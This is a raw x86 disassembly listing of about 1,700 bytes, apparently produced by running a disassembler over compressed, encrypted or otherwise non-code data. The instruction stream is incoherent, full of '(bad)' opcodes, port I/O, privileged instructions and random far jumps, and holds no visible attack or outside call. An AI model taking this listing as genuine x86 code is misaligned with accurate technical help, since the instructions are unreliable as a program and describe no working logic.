  40e236:	xchg   ebx,eax
  40e237:	out    dx,eax
  40e238:	and    eax,DWORD PTR [ebx-0x20]
  40e23b:	add    BYTE PTR [ecx+ecx*1+0x4],0x50
  40e240:	addr16 sub ch,0x75
  40e244:	sar    ecx,0x47
  40e247:	mov    ah,0xa7
  40e249:	lea    esi,[edi]
  40e24b:	shl    DWORD PTR [esi-0x314924e],0xd8
  40e252:	dec    edi
  40e253:	or     ah,BYTE PTR [eax+0x24459b1d]
  40e259:	adc    bh,BYTE PTR [edi]
  40e25b:	or     eax,0x8fb6cc0
  40e260:	sbb    ecx,DWORD PTR [ebx]
  40e262:	in     eax,0x57
  40e264:	fsub   DWORD PTR [ebx]
  40e266:	mov    ch,0xe3
  40e268:	mov    esp,0x32fe985b
  40e26d:	int3   
  40e26e:	push   eax
  40e270:	imul   edi,DWORD PTR [edi-0x555a5558],0xffffff88
  40e277:	shl    BYTE PTR [eax-0x4b],cl
  40e27a:	in     al,dx
  40e27b:	shl    DWORD PTR ds:0x153ec73f,0x59
  40e282:	jno    0x40e2a0
  40e284:	das    
  40e285:	or     DWORD PTR [ecx],0xe79f7f31
  40e28b:	mov    ch,0xc8
  40e28d:	mov    edx,0x4658c950
  40e292:	aas    
  40e293:	pop    ebp
  40e294:	add    BYTE PTR [ebp+ebp*2-0x6e90b3d5],dh
  40e29b:	dec    ecx
  40e29c:	mov    ds:0x4c9ad8b2,al
  40e2a1:	loope  0x40e2d3
  40e2a3:	jle    0x40e31c
  40e2a5:	shr    DWORD PTR [eax],1
  40e2a7:	adc    BYTE PTR [edx-0x21],0xd0
  40e2ab:	(bad)  
  40e2ac:	lods   al,BYTE PTR ds:[esi]
  40e2ad:	aaa    
  40e2ae:	mov    esi,0x3874778d
  40e2b3:	push   esp
  40e2b4:	mov    ecx,0x98b756ce
  40e2b9:	or     eax,0xdd6cd996
  40e2be:	pop    eax
  40e2bf:	loopne 0x40e2b0
  40e2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2c2:	ffreep st(3)
  40e2c4:	ret    
  40e2c5:	aas    
  40e2c6:	inc    ebp
  40e2c7:	ret    0x6ac4
  40e2ca:	xor    DWORD PTR [eax-0x46],edx
  40e2cd:	xor    BYTE PTR [ecx+0x43],bl
  40e2d0:	scas   al,BYTE PTR es:[edi]
  40e2d1:	sbb    al,0x6a
  40e2d3:	ret    0x91f
  40e2d6:	cmp    al,0xf1
  40e2d8:	sub    ah,cl
  40e2da:	jg     0x40e2ef
  40e2dc:	mov    esp,edi
  40e2de:	xchg   ebx,eax
  40e2df:	and    ch,BYTE PTR [eax]
  40e2e1:	out    0x41,eax
  40e2e3:	adc    DWORD PTR [edi],ebp
  40e2e5:	mov    cl,0x4d
  40e2e7:	sub    ebx,ebx
  40e2e9:	jnp    0x40e289
  40e2eb:	fcmovne st,st(3)
  40e2ed:	aam    0x19
  40e2ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2f0:	fwait
  40e2f1:	add    eax,0x52dc6dd
  40e2f6:	in     al,dx
  40e2f7:	adc    DWORD PTR [edx+eax*4],ebp
  40e2fa:	jg     0x40e36d
  40e2fc:	(bad)  
  40e2fd:	into   
  40e2fe:	sbb    eax,DWORD PTR [ecx+0x15418f0c]
  40e304:	jp     0x40e2ac
  40e306:	popa   
  40e307:	pop    eax
  40e308:	adc    eax,0x6e5ff6d9
  40e30d:	mov    ds:0x8a69dafc,al
  40e312:	push   eax
  40e313:	mov    cl,0x32
  40e315:	jmp    0x8ec7:0xc5fe0b8a
  40e31c:	cmp    eax,0x8bee3c19
  40e321:	mov    bh,BYTE PTR [esi]
  40e323:	sbb    DWORD PTR [edx],esp
  40e325:	xchg   edi,eax
  40e326:	sti    
  40e327:	outs   dx,BYTE PTR ds:[esi]
  40e328:	fiadd  WORD PTR [eax]
  40e32a:	shl    DWORD PTR [ebp-0x38],0xf7
  40e32e:	and    al,0xff
  40e330:	xor    esi,DWORD PTR [edx+0x7e]
  40e333:	lods   eax,DWORD PTR ds:[esi]
  40e334:	adc    eax,0x89161824
  40e339:	fist   WORD PTR [ecx-0x22823840]
  40e33f:	icebp  
  40e340:	lock inc esi
  40e342:	ja     0x40e30b
  40e344:	mov    WORD PTR [esi],fs
  40e346:	iret   
  40e347:	cdq    
  40e348:	mov    esp,0x46eed575
  40e34d:	fs push ebx
  40e34f:	lods   al,BYTE PTR ds:[esi]
  40e350:	scas   al,BYTE PTR es:[edi]
  40e351:	mov    bh,0x7d
  40e353:	mov    edi,0x7a5c1f2c
  40e358:	arpl   WORD PTR [ecx],cx
  40e35a:	jecxz  0x40e391
  40e35c:	pop    ebp
  40e35d:	or     al,0x9e
  40e35f:	popw   ds
  40e361:	in     al,dx
  40e362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e363:	loop   0x40e2f7
  40e365:	sti    
  40e366:	sub    BYTE PTR [edi],ch
  40e368:	mov    BYTE PTR [edx+ebp*8+0x148bfdbb],ch
  40e36f:	sub    al,0x6f
  40e371:	add    al,0xc6
  40e373:	xor    al,bl
  40e375:	inc    edi
  40e376:	jp     0x40e38f
  40e378:	adc    eax,0x5fb30b6f
  40e37d:	cmp    DWORD PTR [eax-0x4f36c6e5],edi
  40e383:	enter  0xffdd,0x3
  40e387:	push   ecx
  40e388:	cmp    BYTE PTR [ecx-0x1a],al
  40e38b:	adc    al,0x94
  40e38d:	sub    dl,BYTE PTR [edx]
  40e38f:	lods   eax,DWORD PTR ds:[esi]
  40e390:	pop    esp
  40e391:	jl     0x40e3e5
  40e393:	inc    ebp
  40e394:	ins    DWORD PTR es:[edi],dx
  40e395:	ror    BYTE PTR [edi],0x8a
  40e398:	mov    ch,0x2c
  40e39a:	fld    TBYTE PTR [edx-0x1e1adc19]
  40e3a0:	adc    DWORD PTR [ebx-0x454f4c5d],esi
  40e3a6:	mov    dh,0x2
  40e3a8:	iret   
  40e3a9:	cmp    eax,0x604b198b
  40e3ae:	mov    al,ds:0x84c04c0d
  40e3b3:	or     esp,ebx
  40e3b5:	xor    dl,bl
  40e3b7:	push   esp
  40e3b8:	sbb    al,0x62
  40e3ba:	jbe    0x40e3d6
  40e3bc:	mov    bl,0x56
  40e3be:	adc    eax,0x39907678
  40e3c3:	retf   0x4e45
  40e3c6:	cld    
  40e3c7:	(bad)  
  40e3c8:	adc    DWORD PTR [edx+0x52a56d15],eax
  40e3ce:	in     eax,dx
  40e3cf:	mov    BYTE PTR [edi],dh
  40e3d1:	(bad)  
  40e3d2:	xlat   BYTE PTR ds:[ebx]
  40e3d3:	fucomip st,st(2)
  40e3d5:	pop    ebp
  40e3d6:	lock push edi
  40e3d8:	and    al,0x35
  40e3da:	push   0xfb5f8f00
  40e3df:	jmp    0x40e3c2
  40e3e1:	bound  ecx,QWORD PTR [ebp+0x24]
  40e3e4:	ds nop
  40e3e6:	adc    DWORD PTR [edi-0x41],0xfbf31dc9
  40e3ed:	push   edx
  40e3ee:	jl     0x40e3a2
  40e3f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3f1:	pop    eax
  40e3f2:	or     eax,0x2c7e61e8
  40e3f7:	sahf   
  40e3f8:	leave  
  40e3f9:	mov    al,BYTE PTR [ebx]
  40e3fb:	push   ss
  40e3fc:	imul   esp,DWORD PTR [esi-0x7f],0x5f
  40e400:	in     al,dx
  40e401:	int3   
  40e402:	xor    BYTE PTR [ebx],0xf
  40e405:	sahf   
  40e406:	and    DWORD PTR [ebx+0x24],ebp
  40e409:	cmp    al,0x7a
  40e40b:	iret   
  40e40c:	call   0xdb76715
  40e411:	les    esp,FWORD PTR [ebx]
  40e413:	les    esi,FWORD PTR [ecx+0x26]
  40e416:	rcl    BYTE PTR [edi+0x1c1b5636],0xf6
  40e41d:	pop    es
  40e41e:	sub    edi,DWORD PTR [ebx]
  40e420:	loopne 0x40e437
  40e422:	stc    
  40e423:	gs aas 
  40e425:	or     DWORD PTR [esi+0x5c],eax
  40e428:	mov    esp,0x15334a26
  40e42d:	jg     0x40e461
  40e42f:	clc    
  40e430:	sub    ch,BYTE PTR [edx+0x56e3d3e3]
  40e436:	xor    BYTE PTR [edx],bh
  40e438:	aas    
  40e439:	cld    
  40e43a:	pop    esi
  40e43b:	dec    edi
  40e43c:	and    al,BYTE PTR [ebx-0x2a]
  40e43f:	sti    
  40e440:	(bad)  
  40e441:	jmp    0xde45:0x75ce07ea
  40e448:	icebp  
  40e449:	outs   dx,BYTE PTR ds:[esi]
  40e44a:	scas   eax,DWORD PTR es:[edi]
  40e44b:	sub    al,0xbe
  40e44d:	loop   0x40e3f9
  40e44f:	and    esi,DWORD PTR [esi]
  40e451:	pusha  
  40e452:	push   ss
  40e453:	adc    BYTE PTR [ebp+0x13c5908],bh
  40e459:	xchg   DWORD PTR [ebx+eiz*2],eax
  40e45c:	jmp    0x40e414
  40e45e:	int    0xc0
  40e460:	(bad)  
  40e461:	ins    DWORD PTR es:[edi],dx
  40e462:	pop    esi
  40e463:	mov    dl,0x89
  40e465:	mov    ecx,0x1cee674a
  40e46a:	xchg   ebx,eax
  40e46b:	add    al,0xdb
  40e46d:	push   edx
  40e46e:	aas    
  40e46f:	sbb    ah,BYTE PTR [eax-0xec3febe]
  40e475:	dec    ebp
  40e476:	ins    BYTE PTR es:[edi],dx
  40e477:	mov    cl,0xa0
  40e479:	dec    ebp
  40e47a:	das    
  40e47b:	sub    eax,0xe974056c
  40e480:	mov    bh,0x62
  40e482:	aaa    
  40e483:	test   BYTE PTR [edx+0x7fdbe7b8],dl
  40e489:	repz sar DWORD PTR [eax-0x53],0x5b
  40e48e:	mov    cl,0xc0
  40e490:	mov    ds:0x1ff38db0,eax
  40e495:	test   al,0x2b
  40e497:	mov    al,0x2f
  40e499:	adc    al,0x62
  40e49b:	mov    WORD PTR [ebx+eiz*1],gs
  40e49e:	arpl   WORD PTR [ebx+esi*1-0x19105bf],di
  40e4a5:	les    ebx,FWORD PTR [ecx-0x23f144ac]
  40e4ab:	test   eax,0xa4d7a937
  40e4b0:	xor    DWORD PTR ds:0x8f79fcc,0xffffffff
  40e4b7:	neg    eax
  40e4b9:	sbb    eax,0x6f245529
  40e4be:	ret    
  40e4bf:	pop    edx
  40e4c0:	or     BYTE PTR [edx+edx*8+0xf],0x17
  40e4c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4c6:	in     eax,0x59
  40e4c8:	sbb    eax,0x6291aa7d
  40e4cd:	test   DWORD PTR [edx],ebp
  40e4cf:	mov    ch,0x4e
  40e4d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4d2:	test   DWORD PTR [ecx-0x62ec976],esp
  40e4d8:	mov    cl,0x2d
  40e4da:	retf   0xf587
  40e4dd:	mov    ebp,0x3d73328a
  40e4e2:	cli    
  40e4e3:	rcr    ah,cl
  40e4e5:	mov    ds:0x1896146e,eax
  40e4ea:	fdivrp st(2),st
  40e4ec:	push   edx
  40e4ed:	inc    edx
  40e4ee:	icebp  
  40e4ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4f0:	xor    BYTE PTR [esp+ecx*4],bl
  40e4f3:	ror    BYTE PTR [edx-0x580ea624],1
  40e4f9:	push   edi
  40e4fa:	in     eax,0x9b
  40e4fc:	popf   
  40e4fd:	call   0xedab:0x1b656d86
  40e504:	shr    cl,0xb7
  40e507:	sbb    al,0xa0
  40e509:	cmp    eax,0x4988ab16
  40e50e:	push   ebp
  40e50f:	in     eax,0x7c
  40e511:	push   ebx
  40e512:	xchg   ecx,eax
  40e513:	mov    dl,0x49
  40e515:	repz mov eax,0x3b58d430
  40e51b:	lahf   
  40e51c:	add    DWORD PTR [eax],0x11
  40e51f:	aas    
  40e520:	sti    
  40e521:	ja     0x40e53b
  40e523:	xchg   ecx,eax
  40e524:	pop    edx
  40e525:	xchg   edi,eax
  40e526:	push   edi
  40e527:	xor    BYTE PTR [ebx+0x7139684a],0x95
  40e52e:	scas   al,BYTE PTR es:[edi]
  40e52f:	xor    al,0xd1
  40e531:	sub    al,0x0
  40e533:	or     al,0xab
  40e535:	cmc    
  40e536:	out    0x2b,al
  40e538:	sbb    BYTE PTR ds:0x83a2d19f,0x2e
  40e53f:	push   edx
  40e540:	pop    edi
  40e541:	ins    DWORD PTR es:[edi],dx
  40e542:	mov    WORD PTR [ecx-0x4aac06a9],es
  40e548:	push   edx
  40e549:	dec    edx
  40e54a:	cmp    al,0xd8
  40e54c:	push   edx
  40e54d:	fidivr DWORD PTR [ebx-0x58]
  40e550:	or     DWORD PTR [ebx],eax
  40e552:	jo     0x40e566
  40e554:	popa   
  40e555:	push   edi
  40e556:	jg     0x40e4e9
  40e558:	sbb    eax,eax
  40e55a:	add    DWORD PTR [edx+0x209c0b65],esi
  40e560:	and    al,0x29
  40e562:	sar    DWORD PTR [edx],0x19
  40e565:	jp     0x40e508
  40e567:	idiv   DWORD PTR [ebp-0x739a3ef9]
  40e56d:	sub    ebx,DWORD PTR [ebx]
  40e56f:	sub    eax,0x410c6111
  40e574:	mov    ecx,0x49910f15
  40e579:	aaa    
  40e57a:	stc    
  40e57b:	push   edx
  40e57c:	lock punpckhwd mm0,QWORD PTR [esi+0x7c]
  40e581:	xchg   ebp,eax
  40e582:	xor    bh,al
  40e584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e585:	pop    ecx
  40e586:	mov    BYTE PTR [eax-0x74e8bbd4],bh
  40e58c:	cs mov esp,0x3fcc230
  40e592:	mov    dh,0x8c
  40e594:	data16 (bad) 
  40e596:	enter  0x33e2,0x7a
  40e59a:	lods   eax,DWORD PTR ds:[esi]
  40e59b:	popa   
  40e59c:	ror    BYTE PTR [edi-0x67],cl
  40e59f:	pop    eax
  40e5a0:	pop    ds
  40e5a1:	mov    ds:0x56c36716,al
  40e5a6:	mov    eax,ds:0xd352874e
  40e5ab:	lds    eax,FWORD PTR [esi-0x63]
  40e5ae:	jno    0x40e616
  40e5b0:	aad    0x66
  40e5b2:	mov    esp,DWORD PTR [esi]
  40e5b4:	mov    WORD PTR [edi+ebx*4],gs
  40e5b7:	mov    bl,0x93
  40e5b9:	les    esp,FWORD PTR [ecx+0x60b9ac3a]
  40e5bf:	add    DWORD PTR [edi-0x4d0b1ee],edx
  40e5c5:	std    
  40e5c6:	mov    cl,0x7e
  40e5c8:	and    al,0x79
  40e5ca:	test   eax,0x69a34c80
  40e5cf:	inc    BYTE PTR [edi+ebp*1-0x1249e11d]
  40e5d6:	out    dx,al
  40e5d7:	(bad)  
  40e5d8:	(bad)  
  40e5d9:	xor    ah,0xce
  40e5dc:	or     al,BYTE PTR [ecx+0x27]
  40e5df:	jecxz  0x40e5d3
  40e5e1:	ins    BYTE PTR es:[edi],dx
  40e5e2:	mov    dl,0xac
  40e5e4:	mul    BYTE PTR [edx+0x53]
  40e5e7:	loope  0x40e5e3
  40e5e9:	xchg   ebp,eax
  40e5ea:	leave  
  40e5eb:	jmp    0x40e5cb
  40e5ed:	sbb    DWORD PTR [eax],0x7ba4f92f
  40e5f3:	lods   eax,DWORD PTR ds:[esi]
  40e5f4:	pop    esi
  40e5f5:	pop    ecx
  40e5f6:	popw   ds
  40e5f8:	xor    DWORD PTR [eax+0x12],edx
  40e5fb:	rcr    BYTE PTR [ebx-0x7b],1
  40e5fe:	(bad)  
  40e5ff:	loopne 0x40e602
  40e601:	mov    ebx,0xd54f5b05
  40e606:	pusha  
  40e607:	dec    edi
  40e608:	ja     0x40e60e
  40e60a:	adc    cl,0xa5
  40e60d:	adc    al,0xeb
  40e60f:	mov    edi,0x79d8b7b4
  40e614:	aaa    
  40e615:	cmp    DWORD PTR [esi],ebp
  40e617:	dec    esp
  40e618:	fwait
  40e619:	sub    eax,0xf710a1b3
  40e61e:	adc    DWORD PTR [ebx+edi*2],0x59
  40e622:	jo     0x40e61c
  40e624:	and    eax,0xdd85e267
  40e629:	jb     0x40e699
  40e62b:	pop    ecx
  40e62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e62d:	mul    DWORD PTR [ecx-0x1b7a003a]
  40e633:	adc    eax,0x264ed6c1
  40e638:	aas    
  40e639:	aas    
  40e63a:	lea    edx,[edi+0x7f476536]
  40e640:	push   ss
  40e641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e642:	or     esi,esp
  40e644:	popa   
  40e645:	in     eax,0x16
  40e647:	(bad)  
  40e648:	sar    DWORD PTR [eax+ebp*1],1
  40e64b:	call   0x1ee3:0x12138b7b
  40e652:	or     eax,0x93257cc0
  40e657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e658:	loopne 0x40e5f2
  40e65a:	dec    esp
  40e65b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e65c:	pop    esp
  40e65d:	push   0xe72ee5c0
  40e662:	sub    DWORD PTR [edx+0x34],edi
  40e665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e666:	jge    0x40e628
  40e668:	ficom  WORD PTR [edi]
  40e66a:	sbb    eax,DWORD PTR [esi-0x50]
  40e66d:	in     al,dx
  40e66e:	pop    edx
  40e66f:	push   esp
  40e670:	jecxz  0x40e614
  40e672:	dec    esi
  40e673:	mov    ebp,0xe4c091b
  40e678:	add    DWORD PTR [edx],esi
  40e67a:	cmp    eax,0x5ae62a23
  40e67f:	in     eax,0xb2
  40e681:	mov    edx,0x741d8956
  40e686:	push   ds
  40e687:	or     dh,al
  40e689:	push   ds
  40e68a:	xlat   BYTE PTR ds:[ebx]
  40e68b:	sub    esp,esi
  40e68d:	and    ebp,edx
  40e68f:	push   ebp
  40e690:	into   
  40e691:	test   eax,0x81037bc9
  40e696:	inc    eax
  40e697:	(bad)  
  40e698:	cli    
  40e699:	mov    gs,WORD PTR [edi-0x4e]
  40e69c:	sbb    BYTE PTR [ecx+edi*1-0x36],cl
  40e6a0:	dec    edx
  40e6a1:	mov    ebx,0x4e871a88
  40e6a6:	jecxz  0x40e708
  40e6a8:	mov    esp,0x6d20d4e3
  40e6ad:	cld    
  40e6ae:	add    esi,ebx
  40e6b0:	jecxz  0x40e6de
  40e6b2:	adc    BYTE PTR [ecx-0x5dfa7368],bl
  40e6b8:	out    dx,eax
  40e6b9:	pusha  
  40e6ba:	jecxz  0x40e6ac
  40e6bc:	ins    DWORD PTR es:[edi],dx
  40e6bd:	in     al,dx
  40e6be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6bf:	test   bh,dl
  40e6c1:	inc    eax
  40e6c2:	shr    BYTE PTR [ecx+ebx*1+0x1d],0xac
  40e6c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6c8:	fs in  al,0xcf
  40e6cb:	sar    BYTE PTR fs:[ecx+ecx*2-0xd],cl
  40e6d0:	mov    ds:0x661e0cea,eax
  40e6d5:	mov    bh,0x4e
  40e6d7:	pop    ss
  40e6d8:	es add eax,esi
  40e6db:	xchg   esi,ebx
  40e6dd:	sahf   
  40e6de:	ins    BYTE PTR es:[edi],dx
  40e6df:	pop    ebp
  40e6e0:	cli    
  40e6e1:	sbb    al,0x90
  40e6e3:	jnp    0x40e730
  40e6e5:	out    dx,eax
  40e6e6:	(bad)  
  40e6e7:	sbb    al,0x9d
  40e6e9:	aam    0x58
  40e6eb:	mov    gs,WORD PTR [ecx-0x59d4041c]
  40e6f1:	in     eax,dx
  40e6f2:	lods   eax,DWORD PTR ds:[esi]
  40e6f3:	lods   al,BYTE PTR ds:[esi]
  40e6f4:	inc    ebp
  40e6f5:	outs   dx,DWORD PTR ds:[esi]
  40e6f6:	xor    al,0xc
  40e6f8:	fdivrp st(4),st
  40e6fa:	out    dx,al
  40e6fb:	lock cmp bl,BYTE PTR [eax]
  40e6fe:	and    ebx,DWORD PTR [ebx+0x65ef963a]
  40e704:	mov    ebp,0xcf893df8
  40e709:	and    DWORD PTR [ebp+0x20f2c5d8],ebx
  40e70f:	sub    al,0xdc
  40e711:	and    DWORD PTR [esi+0x225041ad],eax
  40e717:	jl     0x40e6cb
  40e719:	push   eax
  40e71a:	jg     0x40e6ee
  40e71c:	fnstcw WORD PTR [edi+0x75]
  40e71f:	pop    edi
  40e720:	test   al,0x1
  40e722:	add    BYTE PTR [edx-0x99ff05],ch
  40e728:	cmp    cl,cl
  40e72a:	(bad)  
  40e72d:	pop    esi
  40e72e:	repnz ins BYTE PTR es:[edi],dx
  40e730:	jbe    0x40e720
  40e732:	jl     0x40e7a5
  40e734:	cmc    
  40e735:	(bad)  
  40e736:	js     0x40e749
  40e738:	mov    ebp,0x73165bc0
  40e73d:	inc    ecx
  40e73e:	mov    ch,0x47
  40e740:	(bad)  
  40e741:	pop    ebx
  40e742:	lods   eax,DWORD PTR ds:[esi]
  40e743:	sub    al,dh
  40e745:	jbe    0x40e77c
  40e747:	dec    esp
  40e748:	mov    ebp,0x9531f9b
  40e74d:	cli    
  40e74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e74f:	mov    cl,0x87
  40e751:	das    
  40e752:	or     eax,0xada5ed66
  40e757:	ss sub al,0x93
  40e75a:	xchg   esp,eax
  40e75b:	sub    al,ch
  40e75d:	and    edx,esi
  40e75f:	imul   ecx,ebp,0xe4014250
  40e765:	out    dx,al
  40e766:	int    0x3d
  40e768:	rol    BYTE PTR [esi-0x6f],cl
  40e76b:	xor    eax,0x394eaa09
  40e770:	gs popf 
  40e772:	mov    bl,0xb4
  40e774:	aaa    
  40e775:	(bad)  
  40e777:	pop    esi
  40e778:	jle    0x40e7c1
  40e77a:	mov    dl,0x6e
  40e77c:	test   BYTE PTR [ebp+0x79eda096],al
  40e782:	xchg   edi,eax
  40e783:	cmp    DWORD PTR [edx],edi
  40e785:	shl    BYTE PTR [edi-0x2a],cl
  40e788:	add    al,0x52
  40e78a:	retf   
  40e78b:	push   ebx
  40e78c:	loopne 0x40e782
  40e78e:	data16 hlt 
  40e790:	ins    BYTE PTR es:[edi],dx
  40e791:	inc    esp
  40e792:	mov    edx,0xd8b8d4d0
  40e797:	stc    
  40e798:	popf   
  40e799:	mov    cl,0x55
  40e79b:	xchg   DWORD PTR [eax+0x3d],ecx
  40e79e:	push   es
  40e79f:	scas   al,BYTE PTR es:[edi]
  40e7a0:	inc    eax
  40e7a1:	loope  0x40e81c
  40e7a3:	and    eax,0xecbea516
  40e7a8:	add    bh,BYTE PTR [edx+esi*8+0x52fea957]
  40e7af:	leave  
  40e7b0:	xchg   esp,eax
  40e7b1:	add    BYTE PTR [ecx-0x53a11b3a],al
  40e7b7:	mov    dl,0x7f
  40e7b9:	add    dl,BYTE PTR [eax]
  40e7bb:	push   esp
  40e7bc:	and    edi,DWORD PTR [ebx+0x422a17]
  40e7c2:	outs   dx,DWORD PTR ds:[esi]
  40e7c3:	cmc    
  40e7c4:	push   ds
  40e7c5:	pop    ecx
  40e7c6:	xor    eax,0xa0d0cc33
  40e7cb:	mov    ecx,0xc2cff590
  40e7d0:	ins    BYTE PTR es:[edi],dx
  40e7d1:	retf   
  40e7d2:	lods   eax,DWORD PTR ds:[esi]
  40e7d3:	cmp    ecx,DWORD PTR [esi-0x3e0de9b4]
  40e7d9:	loop   0x40e7ec
  40e7db:	bound  esp,QWORD PTR ds:0x89fae2b1
  40e7e1:	pop    es
  40e7e2:	fimul  WORD PTR [ebx]
  40e7e4:	dec    eax
  40e7e5:	popf   
  40e7e6:	ins    DWORD PTR es:[edi],dx
  40e7e7:	ss pop eax
  40e7e9:	add    DWORD PTR [edx+0x32],eax
  40e7ec:	popa   
  40e7ed:	ret    
  40e7ee:	icebp  
  40e7ef:	inc    ebp
  40e7f0:	sti    
  40e7f1:	mov    ?,ebx
  40e7f3:	pop    ebx
  40e7f4:	dec    eax
  40e7f5:	xchg   esi,eax
  40e7f7:	test   BYTE PTR [ecx-0x67],cl
  40e7fa:	pop    ds
  40e7fb:	je     0x40e7bf
  40e7fd:	fcom   DWORD PTR [ebx]
  40e7ff:	pop    ss
  40e800:	xor    al,0x76
  40e802:	add    ebx,eax
  40e804:	scas   al,BYTE PTR es:[edi]
  40e805:	pop    ecx
  40e806:	mov    ds:0x5e57c28c,al
  40e80b:	and    esp,esp
  40e80d:	dec    eax
  40e80e:	gs push 0x3b4bddcb
  40e814:	repz and edx,edx
  40e817:	pop    es
  40e818:	mov    DWORD PTR [edx+0x3bcba866],esi
  40e81e:	push   ss
  40e81f:	div    DWORD PTR [ecx-0x46ceb040]
  40e825:	loopne 0x40e813
  40e827:	xor    BYTE PTR [eax-0x1e],cl
  40e82a:	pop    ecx
  40e82b:	xor    eax,0x2e037b91
  40e830:	mov    ah,0x4e
  40e832:	scas   al,BYTE PTR es:[edi]
  40e833:	sub    BYTE PTR [eax+0x40],bl
  40e836:	retf   0x2293
  40e839:	call   0xb3a:0xec0fd13c
  40e840:	and    eax,0xb8e12965
  40e845:	mov    esp,0x75a94a89
  40e84a:	pop    ecx
  40e84b:	jl     0x40e7d2
  40e84d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e84e:	sbb    dh,dh
  40e850:	adc    ecx,ebp
  40e852:	cmp    edx,DWORD PTR [esi+eax*8-0x4728766a]
  40e859:	out    0x67,eax
  40e85b:	sti    
  40e85c:	jle    0x40e83e
  40e85e:	and    al,dh
  40e860:	cmp    al,0x95
  40e862:	in     eax,0xca
  40e864:	ds jnp 0x40e8af
  40e867:	out    0x71,eax
  40e869:	sub    BYTE PTR [ecx-0x1e],ah
  40e86c:	xchg   ebx,eax
  40e86d:	iret   
  40e86e:	sub    eax,0x756e2d9c
  40e873:	daa    
  40e874:	hlt    
  40e875:	int    0xd1
  40e877:	repnz cmc 
  40e879:	and    BYTE PTR [ecx],al
  40e87b:	setne  BYTE PTR [edx]
  40e87e:	cs cmc 
  40e880:	outs   dx,BYTE PTR ss:[esi]
  40e882:	retf   0x78c1
  40e885:	iret   
  40e886:	shr    dh,1
  40e888:	scas   al,BYTE PTR es:[edi]
  40e889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e88a:	mov    bl,0xa3
  40e88c:	je     0x40e88e
  40e88e:	pop    es
  40e88f:	lock dec eax
  40e891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e892:	fsubr  st,st(6)
  40e894:	fcmove st,st(1)
  40e896:	mov    eax,0xccd68c20
  40e89b:	xor    eax,0xa309426f
  40e8a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8a1:	cld    
  40e8a2:	imul   esi,edx,0x65
  40e8a5:	push   ebx
  40e8a6:	push   cs
  40e8a7:	gs inc ebp
  40e8a9:	pop    ss
  40e8aa:	cmp    bh,dh
  40e8ac:	aaa    
  40e8ad:	imul   eax,DWORD PTR [ecx+0x7b7b4e98],0x53160dc0
  40e8b7:	inc    eax
  40e8b8:	dec    edx
  40e8b9:	popa   
  40e8ba:	test   al,0x41
  40e8bc:	enter  0x1446,0xd
  40e8c0:	add    DWORD PTR [ecx+ecx*4-0x4],0x12
  40e8c5:	xlat   BYTE PTR ds:[ebx]
  40e8c6:	push   esi
  40e8c7:	dec    ebp
  40e8c8:	add    eax,0x8ee12878
  40e8cd:	mov    ecx,0x715270a2
  40e8d2:	neg    DWORD PTR [edx]
  40e8d4:	cmp    eax,0x6d1adbd6
  40e8d9:	adc    DWORD PTR [edx+0x3f],0xb6f94403
  40e8e0:	int    0xe7
  40e8e2:	shl    BYTE PTR [ebx+0x4a0db3e8],0xca
  40e8e9:	cmp    cl,BYTE PTR [edx]
  40e8eb:	idiv   DWORD PTR ds:0x2b142434
  40e8f1:	popf   
  40e8f2:	fmul   QWORD PTR [edx+0x209b1228]
  40e8f8:	es retf 0x9f0a
	...
  40e93c:	add    BYTE PTR [eax],al
  40e93e:	add    BYTE PTR [eax+0x34],ch
  40e941:	fs mov esi,0xf6fafe7c
  40e947:	mov    bl,0x9d
  40e949:	aam    0xd4
  40e94b:	add    bl,al
  40e94d:	scas   al,BYTE PTR es:[edi]
  40e94e:	out    0x4,eax
  40e950:	lock add BYTE PTR [eax],al
  40e953:	and    eax,0x53000007
  40e958:	icebp  
  40e959:	fistp  WORD PTR [eax+eax*8]
  40e95c:	cmp    DWORD PTR [edx],esp
  40e95e:	pusha  
  40e95f:	xchg   ebp,eax
  40e960:	shr    ah,1
  40e962:	(bad)  
  40e964:	hlt    
  40e965:	stc    
  40e966:	adc    dl,BYTE PTR [edx+0x7fe0f881]
  40e96c:	or     al,0xf9
  40e96e:	(bad)  
  40e971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e972:	mov    ch,0xf9
  40e974:	and    BYTE PTR es:[ecx-0x6c],bl
  40e978:	xchg   ecx,eax
  40e979:	adc    bh,BYTE PTR [esi]
  40e97b:	and    eax,0x9fd775f3
  40e980:	and    eax,0x1f64ffa3
  40e985:	jmp    esp
  40e987:	rcl    ecx,1
  40e989:	mov    ecx,DWORD PTR [eax+0x51]
  40e98c:	inc    ecx
  40e98d:	test   al,0xbe
  40e98f:	dec    edx
  40e990:	sbb    BYTE PTR [ecx+edi*8+0x72],0x7d
  40e995:	lock push ebx
  40e997:	mov    DWORD PTR [edi+0x145af863],ecx
  40e99d:	dec    BYTE PTR [ecx]
  40e99f:	jge    0x40e9f1
  40e9a1:	ret    0x6c48
  40e9a4:	int    0xc1
  40e9a6:	(bad)  
  40e9a8:	(bad)  
  40e9a9:	cmc    
  40e9aa:	(bad)  
  40e9ab:	aaa    
  40e9ac:	mov    ebp,?
  40e9ae:	push   edi
  40e9af:	ins    DWORD PTR es:[edi],dx
  40e9b0:	fwait
